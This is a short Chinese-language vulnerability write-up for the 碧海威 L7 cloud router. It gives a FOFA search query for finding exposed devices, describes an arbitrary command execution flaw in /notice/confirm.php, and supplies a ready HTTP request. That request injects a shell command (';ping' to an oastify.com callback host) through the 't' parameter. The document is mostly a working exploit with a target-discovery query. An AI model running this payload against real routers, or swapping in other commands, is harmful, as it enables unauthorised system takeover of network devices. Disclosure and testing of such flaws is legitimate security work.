fofa

```
title="碧海威L7云路由"
```

**二、漏洞简述**

碧海威流控软件L7云路由是一款可以解决公司、企业局域网环境下路由设备，具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。其接口confirm.php存在任意命令执行漏洞，攻击者可通过该漏洞执行命令获取系统权限。

**三、漏洞检测poc**

```yaml
GET /notice/confirm.php?t=;ping%20-c%203%20123.68cp4d60qkwj2i17phst1n58qzwqkg85.oastify.com HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13
Connection: close
```

